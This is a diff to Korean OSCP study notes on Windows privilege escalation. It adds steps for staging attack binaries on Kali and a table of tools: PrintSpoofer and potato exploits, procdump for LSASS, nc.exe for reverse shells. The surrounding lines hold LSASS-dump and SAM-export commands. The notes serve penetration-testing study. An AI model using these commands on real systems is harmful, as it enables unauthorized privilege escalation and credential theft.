@@ -37,6 +37,47 @@ C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
 - Kali의 `pypykatz` (타겟에 mimikatz 올리지 않는다)
 - `nc.exe` 또는 PowerShell 리버스쉘 원라이너
 
+## 도구 바이너리 준비 (Kali)
+
+Kali 경량/미니멀 설치에는 Windows용 바이너리가 기본 포함되지 않으므로 별도로 준비한다.
+
+### 1. apt (windows-resources 패키지)
+
+```bash
+sudo apt update
+sudo apt install -y windows-resources
+```
+
+- 설치 경로: `/usr/share/windows-resources/binaries/` (일부 환경에서는 `/usr/share/seclists/` 하위)
+- 해당 경로에서 `PrintSpoofer.exe` 등 Windows용 익스플로잇/보조 바이너리 존재 확인
+- HTTP 서버로 서빙할 작업 디렉토리로 복사:
+
+```bash
+cp /usr/share/windows-resources/binaries/PrintSpoofer64.exe /tmp/
+cd /tmp && python3 -m http.server 8000
+```
+
+### 2. 직접 다운로드 (Git Clone)
+
+패키지 설치가 원활하지 않거나 최신 버전이 필요할 때:
+
+```bash
+git clone https://github.com/itm4n/PrintSpoofer.git
+```
+
+- 공식 저장소: https://github.com/itm4n/PrintSpoofer
+
+### 도구별 획득 출처 (Kali, 오프라인 전개용)
+
+| 도구 | 용도 | 획득 방법 |
+|---|---|---|
+| `PrintSpoofer64.exe` | SeImpersonate (신OS) | `apt install windows-resources` → `/usr/share/windows-resources/binaries/` 또는 git clone itm4n/PrintSpoofer |
+| `GodPotato-NET4.exe` | SeImpersonate (폭넓음) | `windows-resources` 또는 GitHub (BeichenDream/GodPotato) |
+| `SweetPotato.exe` | SeImpersonate 올인원 | GitHub (CCob/SweetPotato) |
+| `JuicyPotato.exe` | 구OS SeImpersonate | GitHub (ohpe/juicy-potato) |
+| `procdump.exe` | LSASS 덤프 | Sysinternals (Microsoft) 다운로드 |
+| `nc.exe` | 리버스쉘 | `windows-resources` 또는 ncat for Windows |
+
 ## 도구 운용 방식 (OSCP 기준)
 
 - 타겟에 인스톨러를 돌리는 게 아니라 Kali에서 준비한 단일 exe를 업로드해서 실행만 한다
@@ -64,6 +105,7 @@ Get-Item C:\temp\gp.exe
 ### 실행 위치 (쓰기 가능한 임시 폴더만 사용)
 
 - `C:\temp`, `C:\Windows\Temp`, `C:\Users\Public`
+
 #### 현재 사용자 Temp 확인
 
 ```powershell
@@ -92,7 +134,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\temp\lsass.dmp full
 ```
 
 - 리버스쉘: `nc.exe` 대신 PowerShell 원라이너 (파일 전송 불필요)
-SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요
+  SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요
 
 ```powershell
 reg save HKLM\SAM C:\temp\SAM
